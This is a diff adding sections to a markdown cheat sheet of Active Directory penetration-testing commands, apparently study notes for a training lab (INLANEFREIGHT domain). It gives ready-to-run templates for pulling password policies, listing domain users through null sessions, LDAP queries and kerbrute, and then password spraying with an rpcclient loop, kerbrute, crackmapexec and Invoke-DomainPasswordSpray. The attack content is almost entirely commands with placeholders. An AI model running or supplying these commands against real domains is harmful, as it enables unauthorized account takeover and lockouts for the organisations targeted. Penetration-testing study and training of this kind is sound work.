@@ -260,4 +260,166 @@ Inveigh.exe:
 .\Inveigh.exe
 ```
 
-# Password Spraying Overview
+# Sighting In, Hunting For A User
+
+## Enumerating & Retrieving Password Policies
+
+**Tools:**
+
+- CrackMapExec
+- NetExec
+- rpcclient
+- enum4linux
+- enum4linux-ng
+- windapsearch
+- ldapsearch
+- ldapdomaindump
+- PowerView.ps1
+- smbclient
+- net.exe
+
+**Commands - From Linux:**
+
+crackmapexec:
+
+```bash
+crackmapexec smb {IP} -u {USER} -p {PASS} --pass-pol
+```
+
+rpcclient - Null session:
+
+```bash
+rpcclient -U "" -N {IP}
+
+rpcclient $> querydominfo
+rpcclient $> getdompwinfo
+```
+
+enum4linux:
+
+```bash
+enum4linux -P {IP}
+```
+
+ldapsearch:
+
+```bash
+ldapsearch -h {IP} -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
+```
+
+**Commands - From Windows:**
+
+net.exe:
+
+```cmd
+net accounts
+```
+
+Powerview:
+
+```powershell
+Get-DomainPolicy
+```
+
+## Password Spraying - Making a Target User List
+
+**Tools:**
+
+- kerbrute
+- Responder
+- crackmapexec
+- windapsearch
+- ldapsearch
+- enum4linux
+- linkedin2username
+
+**Commands:**
+
+enum4linux - without creds:
+
+```bash
+enum4linux -U {IP}  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
+```
+
+rpcclient - null login:
+
+```bash
+rpcclient -U "" -N {IP}
+
+rpcclient $> enumdomusers
+```
+
+crackmapexec - without creds: 
+
+```bash
+crackmapexec smb {IP} --users
+```
+
+ldapsearch - without creds:
+
+```bash
+ldapsearch -h {IP} -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
+```
+
+windapsearch - without creds:
+
+```
+windapsearch.py --dc-ip {IP} -u "" -U
+```
+
+kerbrute:
+
+```bash
+kerbrute userenum -d {DOMAIN} --dc {IP} {WORDLIST}
+```
+
+crackmapexec - with creds:
+
+```bash
+crackmapexec smb {IP} -u {USER} -p {PASS} --users
+```
+
+# Spray Responsibly
+
+## Internal Password Spraying - from Linux
+
+**Tools:**
+
+- kerbrute
+- rpcclient
+- crackmapexec
+
+**Commands:**
+
+rpcclient - one liner:
+
+```bash
+for u in $(cat {WORDLIST});do rpcclient -U "$u%{PASS}" -c "getusername;quit" {IP} | grep Authority; done
+```
+
+kerbrute:
+
+```bash
+kerbrute passwordspray -d {DOMAIN} --dc {IP} {WORDLIST} {PASS}
+```
+
+crackmapexec: 
+
+```bash
+crackmapexec smb {IP} -u {WORDLIST} -p {PASS} --continue-on-success
+```
+
+## Internal Password Spraying - from Windows
+
+**Tools:**
+
+- DomainPasswordSpray
+
+**Commands:**
+
+DomainPasswordSpray - host domain-joined:
+
+```powershell
+Invoke-DomainPasswordSpray -Password {PASS} -OutFile {FILE_NAME} -ErrorAction SilentlyContinue
+```
+
